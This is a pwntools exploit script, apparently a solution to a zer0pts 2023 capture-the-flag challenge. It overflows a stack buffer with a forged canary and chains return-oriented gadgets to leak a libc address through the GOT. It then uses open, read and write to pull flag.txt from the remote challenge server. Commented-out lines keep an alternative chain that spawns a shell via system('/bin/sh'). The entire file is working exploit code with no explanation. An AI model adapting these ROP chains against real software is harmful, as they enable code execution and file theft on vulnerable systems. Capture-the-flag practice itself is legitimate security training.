from pwn import *

exe = ELF('./bin/vuln')
libc = ELF('./bin/libc.so.6')

exe.address = 0x7fffb7dd729d - (0x128b+18)
print(f'ELF base: {hex(exe.address)}')

pop_rdi_elf = 0x12a3
pop_rsi_r15 = 0x12a1
ret_elf = 0x101a
fmt_scan = 0x2014

pop_rdi_libc = 0x23b6a
pop_rdx = 0x142c92
bin_sh = 0x1b45bd
one = 0xe3b01
ret_libc = 0x22679

#io = process(['./sandbox.py', './bin/vuln'])
io = remote('pwn.2023.zer0pts.com', 9005)

io.recvuntil(b'something\n')
payload = b'i'*264 + p64(0x6161616161616100) + p64(0)
payload += p64(exe.address + pop_rdi_elf) + p64(exe.got['puts']) + p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
io.sendline(payload)
libc.address = u64(io.recvline(keepends=False).ljust(8, b'\0')) - libc.sym['puts']
print(f'Libc base: {hex(libc.address)}')

io.recvuntil(b'something\n')
payload = b'i'*264 + p64(0x6161616161616100) + p64(0)
payload += p64(exe.address + pop_rdi_elf) + p64(0)
payload += p64(exe.address + pop_rsi_r15) + p64(exe.address + 21760) + p64(0)
payload += p64(libc.address + pop_rdx) + p64(100)
payload += p64(libc.sym['read'])
payload += p64(exe.sym['main'])
io.sendline(payload)
io.send(b'./flag.txt\0')

io.recvuntil(b'something\n')
payload = b'i'*264 + p64(0x6161616161616100) + p64(0)
payload += p64(exe.address + pop_rdi_elf) + p64(exe.address + 21760)
payload += p64(exe.address + pop_rsi_r15) + p64(0) + p64(0)
payload += p64(libc.address + pop_rdx) + p64(0)
payload += p64(libc.sym['open'])

payload += p64(exe.address + pop_rdi_elf) + p64(3)
payload += p64(exe.address + pop_rsi_r15) + p64(exe.address + 21760) + p64(0)
payload += p64(libc.address + pop_rdx) + p64(100)
payload += p64(libc.sym['read'])

payload += p64(exe.address + pop_rdi_elf) + p64(1)
payload += p64(exe.address + pop_rsi_r15) + p64(exe.address + 21760) + p64(0)
payload += p64(libc.address + pop_rdx) + p64(100)
payload += p64(libc.sym['write'])


payload += p64(exe.sym['main'])
io.sendline(payload)
io.interactive()


# + p64(libc.address + one)
#payload += p64(libc.address+pop_rdi_libc) + p64(libc.address+bin_sh) + p64(libc.sym['system'])
#io.interactive()